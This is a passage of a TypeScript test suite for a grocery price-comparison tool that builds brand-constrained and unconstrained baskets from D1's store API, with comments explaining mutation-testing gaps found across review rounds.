  });

  test("a failed lookup is unknown, never 'that brand is not sold here'", async () => {
    const client = fakeClient({
      search: [wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" })],
      skuThrows: true,
    });
    const c = await compareBaskets(client, ["arroz"], 100_000_000, { brand: "LATTI" });
    expect(c.alt.lines[0]?.status).toBe("replacement-unknown");
  });
});

describe("renderComparison [BRO-2079]", () => {
  const build = async (brand: string, sweep: unknown[] = []) =>
    compareBaskets(
      fakeClient({
        search: [
          wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" }),
          wire("2", "ARROZ LATTI", { price: 5_000, brand: "LATTI" }),
        ],
        sku: sourceSku("1", "ARROZ BARATO"),
        sweep,
        sweepTotal: 140,
      }),
      ["arroz"],
      100_000_000,
      { brand },
    );

  test("it reports the delta over the shared terms, and says so", async () => {
    const out = renderComparison(await build("LATTI"));
    expect(out).toContain("Over the 1 term BOTH filled");
    expect(out).toContain("$ 2.000 more than best value");
  });

  test("with nothing shared it refuses to report a delta at all", async () => {
    // A delta of zero here would read as "the same price", which is the
    // opposite of what happened.
    const out = renderComparison(await build("TYPOO"));
    expect(out).toContain("no price to compare");
    expect(out).not.toContain("BOTH filled");
    expect(out).not.toContain("the same as best value");
    // And it no longer INFERS anything about the brand from that state.
    expect(out).not.toContain("not an alternative");
  });

  test("unfilled terms are named as a gap, not folded into the number", async () => {
    const out = renderComparison(await build("TYPOO"));
    // NOT "their cost is in neither number above" — nothing shared means no two
    // numbers were printed, and the term's own price IS on screen, so a reader
    // takes that sentence as a claim about it.
    expect(out).not.toContain("neither number above");
  });

  test("...and it DOES point at the two numbers when there are two", async () => {
    // Two terms: one both baskets fill (so a comparison exists), one only the
    // base fills (so something is missing). Both at once is the only state
    // where the sentence is true, and the one-term `build` above cannot make it.
    const c = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" }),
          wire("2", "ARROZ LATTI", { price: 5_000, brand: "LATTI" }),
        ],
        sku: sourceSku("1", "ARROZ OTRA"),
        sweep: [],
      }),
      ["arroz", "arroz"],
      800_000,
      { brand: "LATTI" },
    );
    expect(c.comparable.terms).toBeGreaterThan(0);
    const missing = [...c.onlyBase, ...c.altOverBudget, ...c.altUnknown, ...c.altNoMatch];
    expect(missing.length).toBeGreaterThan(0);
    expect(renderComparison(c)).toContain("Their cost is in neither number above");
  });

  test("it names the brands that did appear when the ask matched none", async () => {
    expect(renderComparison(await build("TYPOO"))).toContain("Brands on these terms' own pages");
  });

  test("it states that both baskets respected the same budget", async () => {
    expect(renderComparison(await build("LATTI"))).toContain("same budget");
  });
});

describe("what `--brand` exits with [BRO-2079]", () => {
  const client = (brandInStock: boolean) =>
    fakeClient({
      search: [
        wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" }),
        ...(brandInStock ? [wire("2", "ARROZ LATTI", { price: 5_000, brand: "LATTI" })] : []),
      ],
      sku: sourceSku("1", "ARROZ BARATO"),
      sweep: [],
    });

  test("the BRANDED basket decides, not the unconstrained one", async () => {
    // A shopper who asks what their list costs in one brand and is told 0 will
    // read that as "yes, in that brand". Swapping `alt` for `base` here
    // survived the entire suite until this existed.
    const empty = await compareBaskets(client(false), ["arroz"], 100_000_000, { brand: "LATTI" });
    expect(empty.base.lines[0]?.status).toBe("filled");
    expect(comparisonExit(empty)).toBe(3);
  });

  test("...and it is 0 when the brand really did fill the list", async () => {
    // The other polarity, so the exit cannot be mutated to a constant 3.
    const found = await compareBaskets(client(true), ["arroz"], 100_000_000, { brand: "LATTI" });
    expect(comparisonExit(found)).toBe(0);
  });
});

describe("the comparison survives the inputs a shopper actually types [BRO-2079]", () => {
  const stub = () =>
    fakeClient({
      search: [
        wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" }),
        wire("2", "ARROZ LATTI", { price: 5_000, brand: "LATTI" }),
      ],
      sku: sourceSku("1", "ARROZ BARATO"),
      sweep: [],
    });

  test("a repeated term whose lines DIFFER is not collapsed to the last one", async () => {
    // The earlier version of this test used a budget both lines fitted, so the
    // two lines were identical and a last-wins Map produced exactly the same
    // answer as positional pairing — the mutation reintroducing the Map
    // survived. The lines have to DIFFER for the join to be observable.
    //
    // Budget fits ONE 3.000 line: line 1 fills, line 2 goes over budget. Under
    // a term-keyed Map both rows show line 2, and the filled line disappears.
    const c = await compareBaskets(stub(), ["arroz", "arroz"], 400_000, { brand: "LATTI" });
    expect(c.base.lines.map((l) => l.status)).toEqual(["filled", "over-budget"]);
    expect(c.rows[0]?.base?.status).toBe("filled");
    expect(c.rows[1]?.base?.status).toBe("over-budget");
    // The money the basket actually spent is still visible in the comparison.
    expect(c.base.total).toBe(300_000);
  });

  test("a REPEATED term does not erase the lines before it", async () => {
    // `byTerm` was a last-wins Map keyed on the term, so every row for a
    // repeated term showed the LAST line and every earlier one vanished —
    // including filled, money-spending ones. The render then reported that
    // nothing was bought and nothing was comparable about a basket that had
    // bought two things, and the dropped line was neither named nor netted.
    const c = await compareBaskets(stub(), ["arroz", "arroz"], 100_000_000, { brand: "LATTI" });
    expect(c.rows).toHaveLength(2);
    expect(c.rows.every((r) => r.base && r.alt)).toBe(true);
    expect(c.comparable.terms).toBe(2);
    // Both baskets bought twice, so the delta is twice the per-line difference.
    expect(c.comparable.delta).toBe(400_000);
  });

  test("the row count always matches the term count", async () => {
    const c = await compareBaskets(stub(), ["arroz", "arroz", "arroz"], 100_000_000, {
      brand: "LATTI",
    });
    expect(c.rows).toHaveLength(3);
    expect(c.base.lines).toHaveLength(3);
    expect(c.alt.lines).toHaveLength(3);
  });
});

describe("a missing term is reported by CAUSE, not lumped [BRO-2079]", () => {
  test("over-budget is a fact about the wallet, not about D1's shelf", async () => {
    // One sentence covering every reason asserted "no LATTI for this" about a
    // branded product that was found, priced, and refused only on money.
    const c = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" }),
          wire("2", "ARROZ LATTI", { price: 90_000, brand: "LATTI" }),
        ],
        sku: sourceSku("1", "ARROZ BARATO"),
        sweep: [],
      }),
      ["arroz"],
      400_000,
      { brand: "LATTI" },
    );
    expect(c.alt.lines[0]?.status).toBe("over-budget");
    expect(c.onlyBase).toEqual([]);
    expect(c.altOverBudget).toEqual(["arroz"]);
    const out = renderComparison(c);
    expect(out).toContain("LATTI found but over budget for: arroz");
    expect(out).not.toContain("no LATTI for");
    // ...and it does not claim the brand was absent from what D1 returned.
    expect(out).not.toContain("Nothing D1 returned");
  });

  test("an unanswered lookup is a fact about the network", async () => {
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" })],
        skuThrows: true,
      }),
      ["arroz"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.altUnknown).toEqual(["arroz"]);
    const out = renderComparison(c);
    expect(out).toContain("the LATTI lookup did not answer for: arroz");
    expect(out).not.toContain("Nothing D1 returned");
  });

  test("the brands hint appears ONLY when no line ever saw the brand", async () => {
    // `!isFilled` included over-budget, so the render printed "Nothing D1
    // returned for these terms is LATTI" directly above "Brands it did return:
    // LATTI" — two adjacent sentences in contradiction.
    const overBudget = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" }),
          wire("2", "ARROZ LATTI", { price: 90_000, brand: "LATTI" }),
        ],
        sku: sourceSku("1", "ARROZ BARATO"),
        sweep: [],
      }),
      ["arroz"],
      400_000,
      { brand: "LATTI" },
    );
    expect(overBudget.brandsSeen).toBeUndefined();

    // The genuine case still offers it.
    const genuine = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" })],
        sku: sourceSku("1", "ARROZ BARATO"),
        sweep: [],
      }),
      ["arroz"],
      100_000_000,
      { brand: "TYPOO" },
    );
    expect(genuine.brandsSeen).toEqual(["OTRA"]);
  });

  test("the hint needs EVERY line to have missed, not merely one", async () => {
    // With one term in every fixture, `every` and `some` are the same function.
    // Two terms, one filled: `some` would print "Nothing D1 returned for these
    // terms is LATTI" about a basket holding a LATTI product.
    const c = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" }),
          wire("2", "ARROZ LATTI", { price: 5_000, brand: "LATTI" }),
        ],
        sku: sourceSku("1", "ARROZ BARATO"),
        sweep: [],
      }),
      ["arroz", "arroz"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.alt.lines.filter((l) => isFilled(l.status))).toHaveLength(2);
    expect(c.brandsSeen).toBeUndefined();
  });
});

describe("onlyAlt is asserted in BOTH polarities [BRO-2079]", () => {
  test("a term only the branded basket could fill is named", async () => {
    // Previously only ever asserted empty, so deleting the filter and the
    // sentence that renders it both passed the whole suite.
    const rows: BasketLine[] = [
      line({ term: "arroz", status: "no-match", product: undefined, price: undefined }),
      line({ term: "leche", price: 200_000 }),
    ];
    const alt = fillToBudget(rows, 1_000_000);
    expect(alt.lines[1]?.status).toBe("filled");

    const c = {
      brand: "LATTI",
      base: fillToBudget(
        [
          line({ term: "arroz", price: 100_000 }),
          line({ term: "leche", status: "no-match", product: undefined, price: undefined }),
        ],
        1_000_000,
      ),
      alt,
      rows: [] as never[],
      comparable: { terms: 0, baseTotal: 0, altTotal: 0, delta: 0 },
      onlyBase: [],
      altOverBudget: [],
      altUnknown: [],
      altNoMatch: [],
      onlyAlt: ["leche"],
      neither: [],
    };
    const out = renderComparison(c as unknown as Parameters<typeof renderComparison>[0]);
    expect(out).toContain("only LATTI could fill: leche");
  });
});

describe("pairRows joins by position [BRO-2079]", () => {
  const plan = (statuses: Array<"filled" | "over-budget">, price = 100_000) => ({
    budget: 1_000_000,
    total: 0,
    remaining: 0,
    lines: statuses.map((status, i) => line({ term: "x", status, price: price + i })),
  });

  test("two lines for the same term stay two rows", () => {
    // A Map keyed on the term collapses them to one, and the row that survives
    // is the LAST — so a filled line vanishes behind an unfilled one.
    const rows = pairRows(["x", "x"], plan(["filled", "over-budget"]), plan(["filled", "filled"]));
    expect(rows).toHaveLength(2);
    expect(rows[0]?.base?.status).toBe("filled");
    expect(rows[1]?.base?.status).toBe("over-budget");
    // Row 0 is comparable, row 1 is not — which a collapsed join cannot express.
    expect(rows[0]?.delta).toBeDefined();
    expect(rows[1]?.delta).toBeUndefined();
  });

  test("a length mismatch is refused rather than silently mis-joined", () => {
    // Unreachable from `compareBaskets` today, which is exactly why the guard
    // needs its own test: a mutation deleting it survived the whole suite.
    expect(() => pairRows(["x", "y"], plan(["filled"]), plan(["filled", "filled"]))).toThrow(
      D1Error,
    );
    expect(() => pairRows(["x"], plan(["filled"]), plan(["filled", "filled"]))).toThrow(D1Error);
  });

  test("matching lengths pass", () => {
    expect(pairRows(["x"], plan(["filled"]), plan(["filled"]))).toHaveLength(1);
  });
});

describe("basketTerms [BRO-2079]", () => {
  test("a whitespace-only term is dropped, not searched for", () => {
    // `.filter(Boolean)` kept "   ", which searched D1 for whitespace and then
    // rendered a nameless comparison row.
    expect(basketTerms(["basket", "arroz", "   ", "leche", ""])).toEqual(["arroz", "leche"]);
  });

  test("the command word itself is never a term", () => {
    expect(basketTerms(["basket"])).toEqual([]);
  });
});

describe("terms neither basket filled are disclosed [BRO-2079]", () => {
  test("a row of two dashes gets a sentence beside it", async () => {
    // Otherwise the reader sees "leche — —" and is left to guess, which is the
    // one thing this output exists not to do.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "CAVIAR", { price: 900_000, brand: "OTRA" })],
        sku: sourceSku("1", "CAVIAR"),
        sweep: [],
      }),
      ["caviar"],
      100_000,
      { brand: "LATTI" },
    );
    expect(c.neither).toEqual(["caviar"]);
    const out = renderComparison(c);
    expect(out).toContain("Neither basket filled: caviar");
    expect(out).toContain("Run the same list without --brand for the reason");
    // No causal claim: when the branded line's own status is `no-brand-match`
    // the failure IS about the brand, and the clause that said otherwise sat
    // four lines under a header saying exactly that.
    expect(out).not.toContain("not about LATTI");
  });
});

describe("renderBasket handles the new status [BRO-2079]", () => {
  test("a no-brand-match line is explained, not called a bug", async () => {
    // `reasonFor` had no arm for it, so it fell to the default: "this line names
    // no product, which is a bug in whatever built this plan" — while the line
    // named the product it had just rejected. Latent today because `--brand`
    // renders via `renderComparison`, which is why it needs its own test.
    const plan = fillToBudget(
      [
        line({
          term: "arroz",
          status: "no-brand-match",
          price: undefined,
          substituteSweep: true,
          swept: 2,
          categoryTotal: 140,
        }),
      ],
      1_000_000,
    );
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("nothing of that brand");
    expect(out).not.toContain("is a bug in whatever built this plan");
    // And the sweep caveat still rides along.
    expect(out).toContain("only 2 of 140 in that category were searched");
  });
});

describe("the comparison never contradicts itself [BRO-2079 round 2]", () => {
  /** Base's best-value pick busts the budget; the branded one fits. */
  const inverted = () =>
    fakeClient({
      search: [
        // Best VALUE per kg, but a big pack — `chooseBest` ranks on unit price,
        // so this wins the unconstrained basket and then does not fit.
        wire("1", "ACEITE OTRA 3000 ML", {
          price: 20_000,
          brand: "OTRA",
          unit: "Ml",
          value: "3000",
        }),
        wire("2", "ACEITE LATTI 900 ML", {
          price: 9_000,
          brand: "LATTI",
          unit: "Ml",
          value: "900",
        }),
      ],
      sku: sourceSku("1", "ACEITE OTRA 3000 ML"),
      sweep: [],
    });

  test("onlyAlt is computed, not merely rendered", async () => {
    // The round-1 "both polarities" test hand-built the CrossBasket, so it
    // pinned the RENDER and left the computation asserted only in its empty
    // polarity — mutating it to `[]` kept the whole suite green, which is
    // exactly the vacuity the changelog claimed had been fixed.
    const c = await compareBaskets(inverted(), ["aceite"], 1_500_000, { brand: "LATTI" });
    expect(c.base.lines[0]?.status).toBe("over-budget");
    expect(c.alt.lines[0]?.status).toBe("filled");
    expect(c.onlyAlt).toEqual(["aceite"]);
    expect(c.comparable.terms).toBe(0);
  });

  test("...and the summary does not then deny the line beside it", async () => {
    // "LATTI is not an alternative for any line above" printed directly above
    // "only LATTI could fill: aceite", with the table showing LATTI filling it.
    const out = renderComparison(
      await compareBaskets(inverted(), ["aceite"], 1_500_000, { brand: "LATTI" }),
    );
    expect(out).toContain("only LATTI could fill: aceite");
    // The summary states what happened and stops; the buckets say the rest.
    // Three rounds each conditioned an "…is not an alternative" clause on one
    // more bucket and each left another open, so the clause is gone.
    expect(out).not.toContain("not an alternative");
    expect(out).toContain("No term was filled by both baskets, so there is no price to compare.");
  });

  test("a term D1 knows nothing about does not trigger the brands hint", async () => {
    // The round-1 fix widened the gate to include `no-match`, which means D1
    // returned nothing at all — nothing to do with the brand. A single typo'd
    // term then printed "Nothing D1 returned for these terms is LATTI" four
    // lines above "that is not about LATTI".
    const c = await compareBaskets(
      fakeClient({ search: [], sku: [], sweep: [] }),
      ["zzqqxxnotaproduct"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.alt.lines[0]?.status).toBe("no-match");
    expect(c.brandsSeen).toBeUndefined();
    const out = renderComparison(c);
    expect(out).not.toContain("Nothing D1 returned for these terms is LATTI");
    expect(out).toContain("Neither basket filled");
  });

  test("a repeated term cannot land in two buckets under one name", async () => {
    // One `aceite` row filled in base, the other unfilled in both. Bare term
    // labels printed "no LATTI for: aceite" AND "Neither basket filled: aceite"
    // — mutually exclusive claims about the same name.
    // Budget fits ONE branded pick, so the two identical terms land in
    // DIFFERENT buckets. The earlier version used a budget that produced one
    // label in one bucket, so `new Set(labels).size === labels.length` was
    // `1 === 1` and could not fail — the very check it was written to make.
    const c = await compareBaskets(inverted(), ["aceite", "aceite"], 1_500_000, { brand: "LATTI" });
    const buckets = [c.onlyBase, c.altOverBudget, c.altUnknown, c.altNoMatch, c.onlyAlt, c.neither];
    const labels = buckets.flat();
    // Both rows are accounted for, and in two DIFFERENT buckets — which is the
    // shape that made the old bare-term labels contradict each other.
    expect(labels).toHaveLength(2);
    expect(buckets.filter((b) => b.length).length).toBe(2);
    expect(new Set(labels).size).toBe(2);
    expect([...labels].sort()).toEqual(["aceite (#1)", "aceite (#2)"]);
  });
});

describe("rowLabels [BRO-2079]", () => {
  test("unique terms keep their own names", () => {
    expect(rowLabels(["arroz", "leche"])).toEqual(["arroz", "leche"]);
  });

  test("a repeated term is numbered in the order it was typed", () => {
    expect(rowLabels(["arroz", "arroz"])).toEqual(["arroz (#1)", "arroz (#2)"]);
    expect(rowLabels(["arroz", "leche", "arroz"])).toEqual(["arroz (#1)", "leche", "arroz (#2)"]);
  });

  test("a term that already looks like a label cannot collide with one", () => {
    // The suffix scheme collides when a bare unique term happens to equal a
    // generated label: `aceite` twice plus the literal `aceite (#1)` produced
    // that string twice, and the two rows then landed in two mutually exclusive
    // buckets under one name. Detected and escalated to row indices, which
    // cannot collide.
    const labels = rowLabels(["aceite (#1)", "aceite", "aceite"]);
    expect(new Set(labels).size).toBe(3);
    expect(labels).toEqual(["1. aceite (#1)", "2. aceite", "3. aceite"]);
  });

  test("labels are unique for every input shape thrown at them", () => {
    const cases: string[][] = [
      [],
      ["a"],
      ["a", "a"],
      ["a", "A"],
      ["a", "a ", " a"],
      ["a (#1)", "a", "a"],
      ["1. a", "a", "a"],
      ["ñ", "ñ", "日本", "日本"],
      Array.from({ length: 50 }, () => "x"),
      ["x".repeat(300), "x".repeat(300)],
      ["a (#2)", "a (#1)", "a", "a"],
    ];
    for (const terms of cases) {
      const labels = rowLabels(terms);
      expect(labels).toHaveLength(terms.length);
      expect(new Set(labels).size).toBe(terms.length);
    }
  });
});

describe("brandLine's guards are load-bearing [BRO-2079]", () => {
  test("the sweep is asked for EVERY candidate, not just the top-ranked one", async () => {
    // `findSubstitutes` slices to `limit` before returning, so asking for 1 and
    // then filtering by brand examines only the closest match — almost never
    // the wanted brand — and reports `no-brand-match` where a match existed.
    // The same defect BRO-2078 hit on the stock path.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" })],
        sku: sourceSku("1", "ARROZ BARATO"),
        // The LATTI product ranks below several closer name matches.
        sweep: [
          wire("9", "ARROZ BARATO EXTRA", { price: 3_100, brand: "OTRA" }),
          wire("10", "ARROZ BARATO SUPER", { price: 3_200, brand: "OTRA" }),
          wire("11", "ARROZ LATTI PREMIUM", { price: 7_000, brand: "LATTI" }),
        ],
        sweepTotal: 140,
      }),
      ["arroz"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.alt.lines[0]?.status).toBe("filled-by-substitute");
    expect(c.alt.lines[0]?.product?.name).toBe("ARROZ LATTI PREMIUM");
  });

  test("an unpriced candidate of the right brand is not offered", async () => {
    // `rankSubstitutes` filters on availability only, and VTEX reports
    // `Price: 0` ("no offer in this region") alongside a positive
    // AvailableQuantity. Without the price filter that candidate wins, `price`
    // becomes undefined, `fillToBudget` downgrades it, and the render says
    // "D1 returned nothing at all" about a product D1 did return.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" })],
        sku: sourceSku("1", "ARROZ BARATO"),
        sweep: [
          // Named to rank ABOVE the priced one against the source. With the
          // unpriced candidate ranked second, dropping the price filter changed
          // no outcome and the test could not fail.
          wire("9", "ARROZ BARATO LATTI", { price: 0, brand: "LATTI" }),
          wire("10", "ARROZ LATTI PREMIUM", { price: 7_000, brand: "LATTI" }),
        ],
        sweepTotal: 140,
      }),
      ["arroz"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.alt.lines[0]?.status).toBe("filled-by-substitute");
    expect(c.alt.lines[0]?.product?.name).toBe("ARROZ LATTI PREMIUM");
    expect(c.alt.lines[0]?.price).toBe(700_000);
  });
});

describe("altNoMatch is computed AND rendered [BRO-2079]", () => {
  test("it is COMPUTED, not only rendered from a hand-built plan", async () => {
    // The same mistake as the round-1 `onlyAlt` test: a hand-built CrossBasket
    // pins the render and leaves the computation asserted nowhere. Emptying it
    // kept the whole suite green.
    //
    // `compareBaskets` issues two identical searches, so the only way alt can
    // see a different shelf from base is for D1 to answer differently between
    // them — rare, real, and exactly what this bucket exists for.
    let searches = 0;
    const impl = (async (url: string) => {
      const u = new URL(String(url));
      if (u.pathname.includes("intelligent-search/product_search")) {
        searches++;
        const products =
          searches === 1 ? [wire("1", "LECHE OTRA", { price: 3_000, brand: "OTRA" })] : [];
        return new Response(JSON.stringify({ products, recordsFiltered: products.length }), {
          status: 200,
        });
      }
      return new Response("[]", { status: 200 });
    }) as unknown as typeof fetch;

    const c = await compareBaskets(new D1Client({ fetchImpl: impl }), ["leche"], 100_000_000, {
      brand: "LATTI",
    });
    expect(c.base.lines[0]?.status).toBe("filled");
    expect(c.alt.lines[0]?.status).toBe("no-match");
    expect(c.altNoMatch).toEqual(["leche"]);
    expect(c.onlyBase).toEqual([]);
    expect(renderComparison(c)).toContain("D1 returned nothing at all for: leche");
  });

  test("a term the branded run found nothing for is named as such", () => {
    // Emptying either the bucket or its render line left the suite green.
    const c = {
      brand: "LATTI",
      base: fillToBudget([line({ term: "leche", price: 100_000 })], 1_000_000),
      alt: fillToBudget(
        [line({ term: "leche", status: "no-match", product: undefined, price: undefined })],
        1_000_000,
      ),
      rows: [],
      comparable: { terms: 0, baseTotal: 0, altTotal: 0, delta: 0 },
      onlyBase: [],
      altOverBudget: [],
      altUnknown: [],
      altNoMatch: ["leche"],
      onlyAlt: [],
      neither: [],
    };
    const out = renderComparison(c as unknown as Parameters<typeof renderComparison>[0]);
    expect(out).toContain("D1 returned nothing at all for: leche");
    // Suppressed: nothing was shared, so there are no two numbers to point at.
    expect(out).not.toContain("neither number above");
  });
});

describe("the brands hint needs EVERY line to have missed [BRO-2079 round 3]", () => {
  test("one filled line suppresses it, however many others missed", async () => {
    // Round 2 tested only the `some(...)` half of its own gate, so deleting the
    // `every(...)` conjunct left the suite green while a basket that had just
    // priced a LATTI product printed "Nothing D1 returned for these terms is
    // LATTI" above the table showing it.
    let searches = 0;
    const impl = (async (url: string) => {
      const u = new URL(String(url));
      if (u.pathname.includes("catalog_system")) {
        return new Response(JSON.stringify(sourceSku("1", "ARROZ OTRA")), { status: 200 });
      }
      if (u.pathname.includes("intelligent-search/product_search")) {
        const isSweep =
          u.pathname.replace(/\/api\/io\/_v\/api\/intelligent-search\/product_search\/?/, "") !==
          "";
        if (isSweep) {
          return new Response(JSON.stringify({ products: [], recordsFiltered: 0 }), {
            status: 200,
          });
        }
        searches++;
        // Odd calls are "leche" (has LATTI), even are "arroz" (does not).
        const products =
          searches % 2 === 1
            ? [wire("2", "LECHE LATTI", { price: 5_000, brand: "LATTI" })]
            : [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })];
        return new Response(JSON.stringify({ products, recordsFiltered: products.length }), {
          status: 200,
        });
      }
      return new Response("[]", { status: 200 });
    }) as unknown as typeof fetch;

    const c = await compareBaskets(
      new D1Client({ fetchImpl: impl }),
      ["leche", "arroz"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.alt.lines.some((l) => isFilled(l.status))).toBe(true);
    expect(c.alt.lines.some((l) => l.status === "no-brand-match")).toBe(true);
    // A line found the brand, so the headline must not claim none did.
    expect(c.brandsSeen).toBeUndefined();
    expect(renderComparison(c)).not.toContain("Nothing D1 returned for these terms is LATTI");
  });

  test("the header IS printed when every line missed (positive polarity)", async () => {
    // Asserted only in the negative before, so deleting the header entirely
    // left the suite green.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })],
        sku: sourceSku("1", "ARROZ OTRA"),
        // BOTH looks complete, or the headline is correctly scoped and this
        // test is asserting the wrong polarity. `sweepTotal` defaults to the
        // sweep's own length, so an omitted one means 0 of 0 — nothing left
        // unlooked-at in either population.
        sweep: [],
      }),
      ["arroz"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.alt.lines[0]?.status).toBe("no-brand-match");
    expect(c.partial).toBeUndefined();
    expect(c.sweepPartial).toBeUndefined();
    const out = renderComparison(c);
    expect(out).toContain("Nothing D1 returned for these terms is LATTI");
    expect(out).toContain("Brands on these terms' own pages: OTRA");
  });

  test("a brand D1 returned but cannot sell is reported as exactly that", async () => {
    // The shape that reaches the defect: every product for the term is a
    // LATTI product that is out of stock. Base cannot fill, so its line is
    // `nothing-in-stock` carrying `product: source` — a LATTI product it
    // REJECTED. Alt is `no-brand-match`, so the headline fires. Reading every
    // base line then printed "Brands it did return: LATTI" directly under
    // "Nothing D1 returned for these terms is LATTI".
    //
    // An earlier fixture put an in-stock OTRA product alongside, so base filled
    // and the unfilled path was never taken. (The companion filled-only guard
    // was later deleted as one of two mutually-masking guards; this exclusion
    // is the load-bearing one, and the name above no longer claims otherwise.)
    const c = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "ARROZ LATTI AGOTADO", { price: 4_000, brand: "LATTI", available: false }),
        ],
        sku: sourceSku("1", "ARROZ LATTI AGOTADO"),
        // Complete in both populations — this test is about which HEADLINE
        // fires, and a partial look correctly rewords both of them.
        sweep: [],
      }),
      ["arroz"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(isFilled(c.base.lines[0]?.status as LineStatus)).toBe(false);
    expect(c.alt.lines[0]?.status).toBe("no-brand-match");
    // D1 DID return a LATTI product — it just cannot be bought here. Saying
    // "nothing D1 returned is LATTI" was false, and the first fix hid the
    // contradiction by filtering LATTI out of the list rather than correcting
    // the claim. Live: `--brand COPELIA leche` returns COCADA LECHE PANELA
    // COPELIA at Price 0.
    expect(c.brandReturnedIn).toBe("page");
    expect(c.brandsSeen).toContain("LATTI");
    const out = renderComparison(c);
    expect(out).toContain("D1 returned LATTI for these terms, but nothing of it can be bought");
    expect(out).not.toContain("Nothing D1 returned for these terms is LATTI");
  });

  test("...and a brand D1 never returned is reported as THAT instead", async () => {
    // The other polarity. Both sentences must exist, or the fix is a rename.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })],
        sku: sourceSku("1", "ARROZ OTRA"),
        sweep: [],
      }),
      ["arroz"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.brandReturnedIn).toBeUndefined();
    const out = renderComparison(c);
    expect(out).toContain("Nothing D1 returned for these terms is LATTI");
    // The negative names a string production CAN emit.
    //
    // It read `not.toContain("cannot be bought")` — and no render path in this
    // module has ever produced "cannot be bought"; the sentence is "can be
    // bought". So the assertion held for every possible output and could not
    // fail. Round 9 found it; it is the sixth test in this arc that could not
    // fail, and the third written by an earlier round as a fix. The other arm's
    // real wording is what must be absent, and the sibling test above asserts
    // that same string PRESENT, so neither can be satisfied by emptiness.
    expect(out).not.toContain("but nothing of it can be bought at this store");
    expect(out).not.toContain("D1 returned LATTI");
  });

  test("a filled line of another brand IS offered as a hint (positive polarity)", async () => {
    // So the two guards above cannot be satisfied by returning nothing at all.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })],
        sku: sourceSku("1", "ARROZ OTRA"),
        sweep: [],
        sweepTotal: 140,
      }),
      ["arroz"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.brandsSeen).toEqual(["OTRA"]);
  });
});

describe("the table label is the bucket label [BRO-2079 round 3]", () => {
  test("a long repeated term is not truncated out of recognition", async () => {
    // `pad(..., 18)` cut at 17 characters, so "aceite de oliva (#2)" rendered
    // as "aceite de oliva (…" — two indistinguishable rows, while the sentence
    // below named "(#2)" precisely. The reader could not map one to the other.
    const c = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "ACEITE DE OLIVA OTRA", { price: 3_000, brand: "OTRA" }),
          wire("2", "ACEITE DE OLIVA LATTI", { price: 90_000, brand: "LATTI" }),
        ],
        sku: sourceSku("1", "ACEITE DE OLIVA OTRA"),
        sweep: [],
      }),
      ["aceite de oliva", "aceite de oliva"],
      400_000,
      { brand: "LATTI" },
    );
    const out = renderComparison(c);
    // Both labels appear IN FULL in the table, not just in the sentences.
    //
    // Scoped to the TABLE. Round 10 added a "What was bought" block whose lines
    // are also indented and also start with the term, so an unscoped filter
    // counts each row twice — and would have gone on "passing" at three rows
    // for two terms if the length assertion had been `toBeGreaterThan`.
    const table = out.split("\nWhat was bought")[0] ?? "";
    const rows = table.split("\n").filter((l) => l.startsWith("  aceite"));
    expect(rows).toHaveLength(2);
    expect(rows[0]).toContain("aceite de oliva (#1)");
    expect(rows[1]).toContain("aceite de oliva (#2)");
    expect(out).not.toContain("…");
    // And every label named in a bucket is findable in the table.
    for (const label of [
      ...c.onlyBase.map((m) => m.term),
      ...c.altOverBudget,
      ...c.altUnknown,
      ...c.altNoMatch,
      ...c.onlyAlt,
      ...c.neither,
    ]) {
      expect(rows.some((r) => r.includes(label))).toBe(true);
    }
  });
});

describe("the brands hint and no-match [BRO-2079 round 4]", () => {
  test("a no-match term alongside a no-brand-match term suppresses the hint", async () => {
    // The one shape the round-3 narrowing changes, and neither test written for
    // it constructed: `no-brand-match` + `no-match`. The round-2 expression
    // (`some(no-brand-match) && every(no-brand-match || no-match)`) admits it
    // and prints "Nothing D1 returned for these terms is LATTI" about a list
    // where LATTI was never the reason for the second term.
    let searches = 0;
    const impl = (async (url: string) => {
      const u = new URL(String(url));
      if (u.pathname.includes("catalog_system")) {
        return new Response(JSON.stringify(sourceSku("1", "ARROZ OTRA")), { status: 200 });
      }
      if (u.pathname.includes("intelligent-search/product_search")) {
        const isSweep =
          u.pathname.replace(/\/api\/io\/_v\/api\/intelligent-search\/product_search\/?/, "") !==
          "";
        if (isSweep) {
          return new Response(JSON.stringify({ products: [], recordsFiltered: 0 }), {
            status: 200,
          });
        }
        searches++;
